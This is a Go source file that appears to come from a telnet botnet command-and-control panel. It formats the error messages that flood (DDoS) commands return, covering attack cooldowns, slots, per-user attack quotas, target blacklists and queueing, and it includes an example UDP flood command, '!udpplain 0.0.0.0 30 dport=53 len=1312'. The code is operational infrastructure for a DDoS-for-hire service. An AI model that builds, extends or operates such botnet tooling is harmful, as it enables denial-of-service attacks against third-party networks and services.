package flood

import (
	"advanced-telnet-cnc/source/config"
	"advanced-telnet-cnc/source/database"
	sessions "advanced-telnet-cnc/source/master/session"
	"errors"
	"fmt"
	"strconv"
	"time"
)

var (
	ErrWrongSyntax      = errors.New("wrong syntax provided")
	ErrRestrictedMethod = errors.New("access to method denied")

	ErrAttacksDisabled = errors.New("attacks disabled")
	ErrGlobalCooldown  = errors.New("global cooldown active")
	ErrUserCooldown    = errors.New("cooldown active")
	ErrTooManyAttacks  = errors.New("too many attacks")
	ErrSlotsFull       = errors.New("slots full")
	ErrAttackQueued    = errors.New("attack queued")

	ErrNoAttacks = errors.New("no attacks left")

	ErrTooManyTargets    = errors.New("too many targets in one flood")
	ErrBlankTarget       = errors.New("blank target")
	ErrInvalidNetmask    = errors.New("invalid netmask")
	ErrTooManySlashes    = errors.New("too many /'s in one target")
	ErrInvalidIP         = errors.New("invalid ip address")
	ErrInvalidDuration   = errors.New("invalid duration")
	ErrBlacklistedTarget = errors.New("target blacklisted")

	ErrUnknownOption            = errors.New("flood does not have this option")
	ErrInvalidOptionCombination = errors.New("option combination invalid")

	ErrResolvingFail = errors.New("dns timeout")

	ErrOptionNotAnInt     = errors.New("invalid flag type")
	ErrOptionNotAnBoolean = errors.New("invalid flag type")

	ErrOptionOutOfRange = errors.New("option is out of min/max range")
	ErrUnkOptionFail    = errors.New("error with attack options")
)

func (method *Method) HandleParseErr(session *sessions.Session, err error) error {
	switch err {
	case ErrWrongSyntax:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because the wrong syntax was provided\r\n"+
			"The right syntax would be: !%s <targets> <duration> [...options]\r\n",
			config.Red,
			method.Name,
		))
	case ErrTooManyAttacks:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because one of the targets you specified is currently limited. Please try again later.\r\n",
			config.Red,
		))
	case ErrRestrictedMethod:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because you don't have access to the %s flood.\r\n",
			config.Red,
			strconv.Quote(method.Name),
		))
	case ErrResolvingFail:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because the specified domain could not be resolved.\r\n",
			config.Red,
		))
	case ErrTooManyTargets:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because there are too many targets in one flood.\r\n",
			config.Red,
		))
	case ErrBlankTarget:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because a blank target was specified.\r\n",
			config.Red,
		))
	case ErrInvalidNetmask:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because an invalid netmask was specified.\r\n",
			config.Red,
		))
	case ErrTooManySlashes:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because too many /'s were in one target.\r\n",
			config.Red,
		))
	case ErrInvalidIP:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because an invalid ip was specified.\r\n",
			config.Red,
		))
	case ErrInvalidDuration:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because your flood duration was under 0 or over your max duration.\r\n",
			config.Red,
		))
	case ErrSlotsFull:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because all the slots are full.\r\n",
			config.Red,
		))
	case ErrGlobalCooldown:
		globalLastFlood, err := database.LastFlood()
		if err != nil {
			return err
		}

		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because the global cooldown is active.\r\nYou may try sending an attack in %.2f seconds.\r\n",
			config.Red,
			time.Until(globalLastFlood.End.Add(time.Duration(config.Master.GlobalCooldown)*time.Second)).Seconds(),
		))
	case ErrUserCooldown:
		lastFlood, err := session.LastFlood()
		if err != nil {
			return err
		}

		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because your cooldown is active.\r\nYou may try sending an attack in %.2f seconds.\r\n",
			config.Red,
			time.Until(lastFlood.End.Add(time.Duration(session.Cooldown)*time.Second)).Seconds(),
		))
	case ErrNoAttacks:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because you used all your attacks.\r\n",
			config.Red,
		))
	case ErrInvalidOptionCombination:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because an invalid option combination was supplied.\r\nExample:!udpplain 0.0.0.0 30 dport=53 len=1312\r\n",
			config.Red,
		))
	case ErrAttacksDisabled:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because attacks are temporarily disabled.\r\n",
			config.Red,
		))
	case ErrBlacklistedTarget:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because one of the targets you specified is blacklisted.\r\n",
			config.Red,
		))
	case ErrOptionNotAnInt:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because one of the options you specified is not an integer.\r\n",
			config.Red,
		))
	case ErrOptionNotAnBoolean:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because one of the options you specified is not an boolean.\r\n",
			config.Red,
		))
	case ErrOptionOutOfRange:
		return session.Print(fmt.Sprintf("%s"+
			"Flood could not be broadcasted because one of the options you specified is out of the minimum/maximum range.\r\n",
			config.Red,
		))
	case ErrAttackQueued:
		lastFlood, err := database.LastFlood()
		if err != nil {
			return err
		}

		if len(queue) > 1 {
			return session.Print(fmt.Sprintf("%s"+
				"Flood has been queued and is in position %d.\r\n",
				config.Red,
				len(queue),
			))
		}

		return session.Print(fmt.Sprintf("%s"+
			"Flood has been queued and will be sent in %.2f seconds.\r\n",
			config.Red,
			time.Until(lastFlood.End.Add(time.Duration(config.Master.GlobalCooldown)*time.Second)).Seconds(),
		))
	}
	return nil
}
